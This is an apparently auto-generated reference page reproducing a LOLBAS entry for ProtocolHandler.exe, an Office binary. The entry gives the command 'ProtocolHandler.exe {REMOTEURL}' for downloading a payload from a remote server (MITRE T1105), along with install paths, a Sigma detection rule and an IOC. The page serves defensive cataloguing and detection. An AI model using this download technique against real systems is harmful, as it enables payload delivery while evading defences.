---
parsed_by: focuslocust
source: lolbas
type: generated
---
# ProtocolHandler.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `protocolhandler.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/ProtocolHandler.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ProtocolHandler.exe](../../tools/windows/protocolhandler.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | protocolhandler.exe |
| name | ProtocolHandler.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
Author: Nir Chako
Commands:
- Category: Download
  Command: ProtocolHandler.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: It will open the specified URL in the default web browser, which (if the URL points to a file) will often result
    in the file being downloaded to the user's Downloads folder (without user interaction)
Created: 2022-07-24
Description: Microsoft Office binary
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
- IOC: Suspicious Office application Internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe
- Path: C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe
Name: ProtocolHandler.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/ProtocolHandler.yml
```

## Detection / Analysis Notes

```text
IOC: Suspicious Office application Internet/network traffic
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
- IOC: Suspicious Office application Internet/network traffic
```
